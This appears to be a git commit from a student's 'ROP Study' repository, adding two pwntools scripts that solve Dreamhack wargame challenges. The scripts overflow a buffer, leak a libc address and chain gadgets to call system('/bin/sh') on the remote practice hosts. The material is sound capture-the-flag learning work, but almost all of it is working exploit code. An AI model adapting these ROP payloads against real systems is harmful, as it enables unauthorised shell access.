c138f1bd04a27d8e5cd41d41ece4b26d22219673
yonguk <dyddnr446@gmail.com>
2026-04-05 22:05:25 +0900

    ROP Study

--- 000_Wargame/l2/Basic_ROP_x64/basic_rop_x64.py
+++ 000_Wargame/l2/Basic_ROP_x64/basic_rop_x64.py
@@ -1,2 +1,34 @@
 from pwn import *
 
+p = remote("host8.dreamhack.games", 17507)
+
+libc = ELF("./libc.so.6")
+e = ELF("basic_rop_x64")
+r = ROP("./basic_rop_x64")
+# 가젯 찾기
+pop_rdi = r.find_gadget(["pop rdi", "ret"])[0]
+pop_rsi_r15 = r.find_gadget(['pop rsi','pop r15', 'ret'])[0]
+
+payload = b'A' * 0x48
+payload += p64(pop_rdi) + p64(1)
+payload += p64(pop_rsi_r15) + p64(e.got['read']) + p64(0)
+payload += p64(e.plt['write'])
+payload += p64(e.symbols['main']) # 다시 main으로 돌아가기
+
+p.send(payload)
+p.recvuntil(b'A'*0x40)
+
+# 릭된 주소 읽기
+read_addr = u64(p.recvn(6) + b'\x00\x00')
+lb = read_addr - libc.symbols['read']
+system = lb + libc.symbols['system']
+binsh = lb + next(libc.search(b"/bin/sh"))
+
+# [2] Exploit (system 호출)
+payload = b'A' * 0x48
+payload += p64(pop_rdi) + p64(binsh)
+payload += p64(system)
+sleep(0.2)
+p.send(payload)
+
+p.interactive()
--- 000_Wargame/l2/Basic_ROP_x86/basic_rop_x86.py
+++ 000_Wargame/l2/Basic_ROP_x86/basic_rop_x86.py
@@ -1,13 +1,13 @@
 from pwn import *
 
-TEST = True
+TEST = False
 
 if TEST:
     p = process("",12)
     e = ELF("./basic_rop_x86")
     libc = e.libc
 else :
-    p = remote("./basic_rop_x86")
+    p = remote("host3.dreamhack.games",19573)
     e = ELF("./basic_rop_x86")
     libc = ELF("./libc.so.6")
 
@@ -18,6 +18,7 @@ read_plt = e.plt["read"]
 read_got = e.got["read"]
 write_plt = e.plt["write"]
 write_got = e.got["write"]
+
 main = e.symbols["main"]
 
 read_offset = libc.symbols["read"]
@@ -32,12 +33,27 @@ pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
 #1단계
 payload = b'A' * 0x48
 payload += p32(write_plt)
-payload +=(pop3_ret)
+payload += p32(pop3_ret)
 payload += p32(1) + p32(read_got) + p32(4)
 payload += p32(main)
 
 p.send(payload)
 p.recvuntil(b'A' * 0x40)
 
-
 read = u32(p.recvn(4))
+libc_base = read - read_offset
+system = libc_base + system_offset
+sh = libc_base + sh_offset
+
+print(hex(libc_base))
+print(hex(system))
+
+
+payload = b'B' * 0x48
+payload += p32(system)
+payload += p32(pop_ret)
+payload += p32(sh)
+
+p.send(payload)
+p.recvuntil(b'B'*0x40)
+p.interactive()
